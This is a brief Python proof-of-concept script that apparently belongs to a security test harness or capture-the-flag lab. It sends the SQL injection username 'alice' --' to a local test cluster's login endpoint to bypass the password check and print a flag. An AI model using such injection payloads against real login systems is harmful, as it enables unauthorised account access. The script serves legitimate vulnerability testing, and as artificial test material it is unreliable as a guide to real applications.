"""CWE-89 PoC: the username changes the SQL query."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from tests.test_system import Cluster

with Cluster('sql') as cluster:
    status, result = cluster.call('/login', {
        'username': "alice' --", 'password': 'alice-pass'
    })
    print(status, result.get('flag'))
